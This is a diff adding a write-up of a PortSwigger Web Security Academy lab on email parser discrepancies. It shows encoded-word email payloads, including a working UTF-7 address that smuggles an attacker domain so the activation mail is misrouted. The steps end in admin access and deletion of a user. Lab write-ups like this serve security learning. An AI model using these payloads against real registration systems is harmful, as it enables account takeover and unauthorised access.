@@ -671,6 +671,85 @@ LESSONS LEARNED: -- gotta be creative about it
 
 
 
+---
+
+
+<img width="655" height="451" alt="image" src="https://github.com/user-attachments/assets/e98d7e8d-35aa-4e2f-bb7c-a98cef847c7e" />
+
+
+
+#### //LAB:
+
+
+
+
+
+
+- read this `https://portswigger.net/research/splitting-the-email-atom`
+- then proceed to register for an account
+- try this iso payload as seen in the research article -- but it is blocked
+- `=?iso-8859-1?q?=61=62=63?=tool@ginandjuice.shop`
+
+<img width="1247" height="385" alt="image" src="https://github.com/user-attachments/assets/d382c7ee-7c07-4c12-85b9-8849502e92aa" />
+
+
+- utf-8 payload also fails -- blocked
+- `=?utf-8?q?=61=62=63?=tool@ginandjuice.shop`
+
+<img width="1246" height="384" alt="image" src="https://github.com/user-attachments/assets/43c45247-6aad-4935-b4e3-0c4688bfdfa9" />
+
+
+
+- now try utf-7
+- try and url-encode it as well or it breaks
+- and it seems to have gone through
+- but there's no activation email in our mailbox
+
+<img width="1239" height="518" alt="image" src="https://github.com/user-attachments/assets/1cf2d952-c19a-44c0-9758-f3769e6e9f9f" />
+
+
+- try cyberchef UTF-7 encoding
+- but it fails
+
+<img width="1228" height="614" alt="image" src="https://github.com/user-attachments/assets/fe671810-5f55-4142-8cdf-26fd13f1558f" />
+
+
+
+- eventually this works `=?utf-7?q?attacker%26AEA-exploit-0a0200a103532e2b81db8d59013b0098.exploit-server.net%26ACA-?=@ginandjuice.shop`
+- the `&AEA` is `@`
+- the `&ACA` is ` ` space
+- note that we need to url-encode the `&`
+
+
+
+<img width="1240" height="524" alt="image" src="https://github.com/user-attachments/assets/e0592340-fbf8-4c2b-8288-eabc27807229" />
+
+
+
+
+- finally got an activation email
+
+<img width="1156" height="541" alt="image" src="https://github.com/user-attachments/assets/48fe70b8-2817-4564-af61-10a324ea439d" />
+
+
+- click on the link
+- and log in with our creds
+
+<img width="1193" height="566" alt="image" src="https://github.com/user-attachments/assets/e69fd7cc-cb98-45fd-866e-e297bf851e81" />
+
+
+- hit admin panel
+- delete carlos
+- and lab solved finally
+
+<img width="1185" height="473" alt="image" src="https://github.com/user-attachments/assets/2df1bed0-59ed-4778-85e0-868189c3de78" />
+
+
+
+
+
+
+
 
 
 
